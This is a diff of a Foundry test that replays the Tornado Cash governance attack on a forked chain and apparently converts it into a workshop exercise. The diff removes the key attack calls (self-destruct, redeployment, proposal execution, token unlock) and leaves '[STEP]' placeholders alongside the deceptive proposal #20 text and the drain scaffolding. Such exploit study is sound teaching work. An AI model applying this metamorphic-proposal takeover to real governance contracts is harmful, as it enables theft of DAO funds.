@@ -2,15 +2,15 @@
 pragma solidity ^0.8.17;
 
 import "forge-std/Test.sol";
-import {TestHarness} from "../../TestHarness.sol";
-import {IERC20} from "../../interfaces/IERC20.sol";
-import {IWETH9} from "../../interfaces/IWETH9.sol";
-import {Ownable} from "./AttackerOwnable.sol";
-import "./TornadoGovernance.interface.sol";
-import "./Attacker1Contracts.sol";
-import "./Attacker2Contracts.sol";
+import {TestHarness} from "test/TestHarness.sol";
+import {IERC20} from "base-interfaces/IERC20.sol";
+import {IWETH9} from "base-interfaces/IWETH9.sol";
+import {Ownable} from "tornado-cash-workshop/AttackerOwnable.sol";
+import "tornado-cash-workshop/TornadoGovernance.interface.sol";
+import "tornado-cash-workshop/Attacker1Contracts.sol";
+import "tornado-cash-workshop/Attacker2Contracts.sol";
 
-contract Exploit_TornadoCashGovernance is TestHarness {
+contract Stage2 is TestHarness {
     uint256 forkIdBefore;
 
     uint256 proposalId;
@@ -62,12 +62,24 @@ contract Exploit_TornadoCashGovernance is TestHarness {
         vm.rollFork(17_249_552);
         console2.log("Submitting proposal...");
         vm.startPrank(ATTACKER2);
+        /* Proposal String
+        '{"title":"Proposal #20: Relayer registry penalization","description":"Penalize following relayers who
+        is cheating the protocol.\nThe staked balances of these relayers are not burned at all, so the staking
+        reward of valid participants are not properly paid.\n\n0xcBD78860218160F4b463612f30806807Fe6E804C
+        tornadope.eth\n0x94596B6A626392F5D972D6CC4D929a42c2f0008c
+        0xgm777.eth\n0x065f2A0eF62878e8951af3c387E4ddC944f1B8F4
+        0xtorn365.eth\n0x18F516dD6D5F46b2875Fd822B994081274be2a8b abc321.eth\n\nUse same logic of proposal
+        #16."}'
+        */
+
         proposalId = TORNADO_GOVERNANCE.propose(
             address(proposal_20),
             '{"title":"Proposal #20: Relayer registry penalization","description":"Penalize following relayers who is cheating the protocol.\nThe staked balances of these relayers are not burned at all, so the staking reward of valid participants are not properly paid.\n\n0xcBD78860218160F4b463612f30806807Fe6E804C tornadope.eth\n0x94596B6A626392F5D972D6CC4D929a42c2f0008c 0xgm777.eth\n0x065f2A0eF62878e8951af3c387E4ddC944f1B8F4 0xtorn365.eth\n0x18F516dD6D5F46b2875Fd822B994081274be2a8b abc321.eth\n\nUse same logic of proposal #16."}'
         );
+
         vm.stopPrank();
 
+        // This step is on us. Simulate other's votes.
         console2.log("\n======== STAGE 1.1 VOTE PROPOSAL ========");
         console2.log("Locking funds with voter...");
         cheat.rollFork(17_265_000);
@@ -98,25 +110,25 @@ contract Exploit_TornadoCashGovernance is TestHarness {
         // 3. Selfdestruct both the proposal and transient contract, with the account 2
         // https://explorer.phalcon.xyz/tx/eth/0xd3a570af795405e141988c48527a595434665089117473bc0389e83091391adb?line=0&debugLine=0
         vm.startPrank(ATTACKER2);
-        proposalFactory.emergencyStop();
+        // [STEP] Trigger the emergencyStop (selfdestruction) of the proposal and transient @audit
         vm.stopPrank();
 
         // Simulate selfdestruction in foundry local vm with a custom cheatcode
-        destroyAccount(address(proposal_20), address(0));
-        destroyAccount(address(transientContract), ATTACKER2);
+        // [STEP] Destroy the proposal 20 using foundry cheatcode @audit
+        // [STEP] Destroy the transient contract using foundry cheatcode @audit
 
         vm.rollFork(17_299_106);
         console2.log("Fork Block Number: %s", block.number); // just before the redeployment
 
         console2.log("\n======== STAGE 4. REDEPLOY THE PROPOSAL AND TRANSIENT ========");
-        // 3. Redeploy malicious proposal with the additional SSTORE instructions
+        // 4. Redeploy malicious proposal with the additional SSTORE instructions
         // https://explorer.phalcon.xyz/tx/eth/0xa7d20ccdbc2365578a106093e82cc9f6ec5d03043bb6a00114c0ad5d03620122?line=2&debugLine=2
         console2.log("Before Redeployment Code Size");
         console2.log("Transient: %s", address(proposal_20).code.length);
         console2.log("Proposal: %s \n", address(transientContract).code.length);
 
         vm.startPrank(ATTACKER2);
-        _redeployTransientAndProposal();
+        // [STEP] Redeploy Transient and Proposal @audit
         vm.stopPrank();
 
         console2.log("\nAfter Redeployment Code Size");
@@ -135,7 +147,7 @@ contract Exploit_TornadoCashGovernance is TestHarness {
             "Not enough votes"
         );
 
-        TORNADO_GOVERNANCE.execute(proposalId);
+        // [STEP] Execute the malicious proposal on Tornado Cash Governance @audit
         console2.log("Execution successful");
 
         console2.log("\n======== STAGE 6. DRAIN TORN FROM GOVERNANCE ========");
@@ -147,8 +159,8 @@ contract Exploit_TornadoCashGovernance is TestHarness {
         // The locked balance slots were wrote with 10,000e18 granting that amount of tokens per account
         // This call is made with a for loop over all the minions.
         cheat.rollFork(17_304_425); // just before the drain
-        address[] memory minions = attacker1contract.getMinions();
 
+        address[] memory minions = attacker1contract.getMinions();
         console2.log("Before Drain ");
         for (uint256 i = 0; i < minions.length; i++) {
             console2.log("Minion%s Locked Balance: %s", i + 1, TORNADO_GOVERNANCE.lockedBalance(minions[i]));
@@ -156,7 +168,7 @@ contract Exploit_TornadoCashGovernance is TestHarness {
         console2.log("Attacker1 TORN Balance: %s", tornToken.balanceOf(ATTACKER1));
 
         // This part is coordinated by the Attacker1 minion factory
-        attacker1contract.triggerUnlock();
+        // [STEP] Unlock the TORN tokens for each minion @audit
 
         console2.log("\nAfter Drain ");
         for (uint256 i = 0; i < minions.length; i++) {
@@ -225,6 +237,10 @@ contract Exploit_TornadoCashGovernance is TestHarness {
         console2.log("Transient deployed at: %s", address(transientContract));
         console2.log("Proposal 20 deployed at: %s", address(proposal_20));
     }
+
+    /*
+        REFERENCE ON THE NEWLY ADDED CHEATCODE
+    */
 
     // New cheatcode created by @joaquinlpereyra @Coinspect merged in foundry at
     // https://github.com/foundry-rs/foundry/pull/5033
